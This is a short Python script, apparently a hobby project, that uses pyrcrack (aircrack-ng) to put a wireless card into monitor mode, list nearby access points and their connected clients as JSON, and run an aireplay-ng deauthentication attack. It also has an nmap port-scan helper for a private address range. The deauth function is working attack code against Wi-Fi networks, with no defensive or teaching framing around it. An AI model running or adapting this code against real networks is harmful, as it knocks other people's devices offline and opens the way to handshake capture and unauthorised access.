import pyrcrack
import nmap
import sys
import asyncio
import json
from flask import Flask 
from async_timeout import timeout
from contextlib import suppress

app = Flask(__name__)

@app.route("/")
def index():
    return "Index"


def runNmap(ip):
    # ip = '10.202.208.1'
    ports = '30'
    nm = nmap.PortScanner()
    nm.scan(ip, ports)
    print("scan info")
    print(nm.scaninfo())
    print("")
    print("hosts:")
    hosts = nm.all_hosts()
    print(hosts)
    print("")
    print("hostnames:")
    for x in hosts:
        # tempIP = '10.202.208.' + str((x + 1))
        print(nm[x].hostname())

async def attack(interface, apo):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], apo.channel)
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(
                interface['interface'], deauth=sys.argv[1], D=True)
            print(await aireplay.proc.communicate())

async def getAps():
    """Scan for targets, return json."""
    async with pyrcrack.AirmonNg() as airmon:
        interface = (await airmon.list_wifis())[0]['interface']
        interface = (await airmon.set_monitor(interface))[0]
        async with pyrcrack.AirodumpNg() as pdump:
            await pdump.run(interface['interface'], write_interval=1)
            await asyncio.sleep(20)
            aps = pdump.sorted_aps()
            apsList = []
            for ap in aps:
                currentDict = {"bssid": ap.bssid, "essid": ap.essid,"channel": ap.channel, "clients": [c.station_mac for c in ap.clients]}
                apsList.append(currentDict)
        #       await attack(interface, apo)
            print(json.dumps(apsList))
            return json.dumps(apsList)


async def printing():
    async with pyrcrack.AirmonZc() as airmon:
        print(await airmon.list_wifis())

#if __name__ == "__main__":
#    app.run(debug=True)

# runNmap('10.202.208.1-30')
asyncio.run(getAps())
# asyncio.run(printing())
